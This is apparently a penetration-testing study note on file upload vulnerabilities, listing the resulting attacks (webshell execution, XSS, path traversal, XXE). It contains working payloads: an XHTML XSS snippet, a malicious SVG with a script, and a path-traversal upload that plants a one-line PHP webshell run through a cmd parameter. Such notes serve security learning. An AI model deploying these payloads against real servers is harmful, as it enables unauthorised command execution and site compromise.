---
tags:
  - CyberSec
  - CiscoEH
  - Vulns/Web
  - NBBC
---
Uploaded files represent a significant risk to applications. The first step in many attacks is to get some code to the system to be attacked. Then the attack only needs to find a way to get the code executed. Using a file upload helps the attacker accomplish the first step. 
The consequences of unrestricted file upload can vary, including complete system takeover, an overloaded file system or database, forwarding attacks to back-end systems, client-side attacks, or simple defacement. It depends on what the application does with the uploaded file and especially where it is stored.
- Upload a webshell and gain Remote Command Execution (RCE)
- RCE or Cross-Site Scripting via file name
- XSS via file upload
- Path Traversal with the ability to overwrite local files
- XXE if docx, pptx, xlsx, xml or similar files are allowed

The most important fields to focus on are:
- [[Content Type]]
- filename
- file extension
- the data that is sent
  
![[File Upload Vulnerabilities-img-202507170953.png]]
![[File Upload Vulnerabilities-img-202507170954.png]]
![[File Upload Vulnerabilities-img-202507170954 3.png]]
XSS![[File Upload Vulnerabilities-img-202507170954 4.png]]
![[File Upload Vulnerabilities-img-202507170954 5.png]]
Path traversal![[File Upload Vulnerabilities-img-202507170955.png]]

xml:
`<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(document.domain)</x:script>`

exploiting svg uploads 
set content-type as image/svg+xml2
payload 
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
alert(document.domain);
</script>
</svg>
```

extracting info by path traversing 
	you can upload any files including php but php is disabled in the uploads directory.
	Set filename on upload to ../shell.php and this will upload to the webroot, upload a webshell here:
	File Contents:
	`<?php echo shell_exec($_GET["cmd"]); ?>`
	give url params `/shell.php?cmd=ls`


---
- https://github.com/BlackFan/content-type-research
zipslip : https://www.youtube.com/watch?v=q0S_NRq6BVc